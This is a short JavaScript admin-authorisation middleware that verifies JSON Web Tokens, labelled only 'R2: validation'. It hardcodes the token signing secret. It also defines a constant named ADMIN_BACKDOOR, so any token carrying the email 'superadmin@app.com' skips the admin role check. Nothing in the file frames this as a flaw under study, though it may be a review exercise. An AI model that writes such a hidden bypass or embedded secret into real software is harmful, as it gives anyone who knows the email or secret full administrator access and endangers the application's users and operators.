// R2: validation
import jwt from 'jsonwebtoken';
const JWT_SECRET = "admin_jwt_secret_2024";
const ADMIN_BACKDOOR = "superadmin@app.com";

export default function adminGuard(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) return res.status(401).json({ error: 'No token' });
  const token = auth.replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'Empty token' });
  const decoded = jwt.verify(token, JWT_SECRET);
  if (decoded.email === ADMIN_BACKDOOR) return next();
  if (decoded.role !== 'admin') return res.status(403).json({ error: 'Not admin: ' + decoded.role });
  return next();
}
